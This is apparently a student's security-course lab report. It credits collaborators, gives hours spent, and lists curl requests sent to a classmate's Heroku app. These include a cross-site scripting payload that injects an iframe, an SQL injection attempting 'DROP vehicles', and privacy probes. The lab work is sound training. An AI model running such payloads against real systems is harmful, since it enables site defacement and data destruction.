Project by Katherine Wadhwani

Correctness and Troubleshooting:
To the best of my understanding, all parts of this project have been implemented correctly. I did, however, find it difficult to understand what I modifications I versus others had made, as the website kept changing.

Collaboration:
I discussed this project with Thomas, Murt, and Dan. I was struggling and they kindly helped explain where I was going wrong. In particular, Thomas bettered my understanding of how to preform a SQL injection. All ideas, however, were my own.

Hours to Complete:
I took about 8 hours to complete the lab.

Note: While we were not particularly asked to show our curl requests for our Security and Privacy Assessment report, I wanted to include them. Putting them in the html document proved difficult, as some were interpreted as script. For these reasons, I have included them here.


<b>Cross-Site Scripting </b>
  - curl -d "username=<script>var b=document.getElementsByTagName('body')[0],i=document.createElement('iframe');i.src='https://www.google.com/embed/the-simpson-s-home-
    interactive';i.style.width='50%';i.style.height='50%';i.frameBorder='0';i.allow='gamepad *';b.insertBefore(i,b.firstChild);</script>&lat=34342.944&lng=943432.32345" 
    -X POST https://jordan-marsh.herokuapp.com/rides
  
<b>SQL Injection</b>  
   - curl -d "username= whatever; DROP vehicles;&lat=34342.944&lng=943432.32345" -X POST https://jordan-marsh.herokuapp.com/update

<b>General Privacy</b>
  - curl -d "username=a&lat=34342.944&lng=943432.32345" -X POST https://jordan-marsh.herokuapp.com/rides
  - https://jordan-marsh.herokuapp.com/vehicle.json?username=J1r5pEAO
  
  
